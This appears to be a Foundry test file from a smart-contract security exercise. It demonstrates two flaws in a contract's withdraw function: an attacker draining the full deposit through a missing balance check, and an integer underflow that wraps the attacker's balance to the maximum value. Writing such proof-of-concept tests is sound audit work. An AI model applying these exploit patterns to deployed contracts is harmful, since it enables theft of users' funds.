// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
pragma abicoder v2;

import {Test, console} from "forge-std/Test.sol";
import {R0Q6} from "../src/RACE0Q6.sol";

contract R0Q6Test is Test { 
    R0Q6 r0q6;
    address attacker = makeAddr("attacker");
    uint256 depositAmount = 100 ether;

    function setUp() public {
        r0q6 = new R0Q6();

        // deposit ether into the contract
        address(r0q6).call{value: depositAmount}("");
    }

    function test_missingCheckOnUserBalanceInWithdraw() public {
        // confirm attacker has 0 ether
        assertEq(attacker.balance, 0);

        // confirm the contract has the deposit amount
        assertEq(address(r0q6).balance, depositAmount);

        // attacker calls withdraw for the deposit amount (balance of the tartget)
        vm.prank(attacker);
        r0q6.withdraw(depositAmount);

        // now attacker has the balance
        assertEq(attacker.balance, depositAmount);
    }

    function test_IntegerUnderflowLeadingToWrapping() public {
        // confirm the attackers balance in the mapping is 0
        assertEq(r0q6.balances(attacker), 0);

        // attacker calls withdraw with 1 wei to cause underflow
        vm.prank(attacker);
        r0q6.withdraw(1);

        // the balance overflows and attacker has a large balance!
        assertEq(r0q6.balances(attacker), type(uint256).max);
    }
}